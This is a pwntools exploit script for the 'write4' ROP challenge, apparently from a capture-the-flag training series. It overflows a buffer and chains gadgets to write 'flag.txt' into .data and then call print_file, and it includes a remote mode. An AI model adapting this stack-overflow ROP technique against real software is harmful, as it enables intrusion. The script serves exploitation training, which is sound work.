from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './write4'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 40

# I want to write the value of flag.txt into the .data section (size = 8)
data_addr = 0x601028

# pop the value of .data section into edi then pop the string flag.txt into ebp
pop_r14_pop_r15 =  0x0000000000400690 # pop r14; pop r15; ret; 
    

# move the value of ebp (flag.txt) to the address pointed by edi (.data)
mov_gadget = 0x0000000000400628 # mov QWORD PTR [r14],r15

# print file function (we will call print file function passing in the value flag.txt)
print_file = elf.plt['print_file']

pop_rdi = 0x0000000000400693 # pop rdi; ret; 

info("data address %#x", data_addr)
info("pop r14; pop r15 %#x", pop_r14_pop_r15)
info("mov dword ptr [r14], r15; %#x", mov_gadget)
info("print file function address %#x", elf.plt['print_file'] )

# Build the payload
payload = flat({
    offset: [
        pop_r14_pop_r15,
        data_addr,
        b'flag.txt',
        mov_gadget,
        pop_rdi,
        data_addr,
        print_file
       
    ]
})

# Send the payload
io.sendlineafter(b'>', payload)
io.recvuntil(b'Thank you!')
io.recvline()

flag = io.recvline()
success(flag)
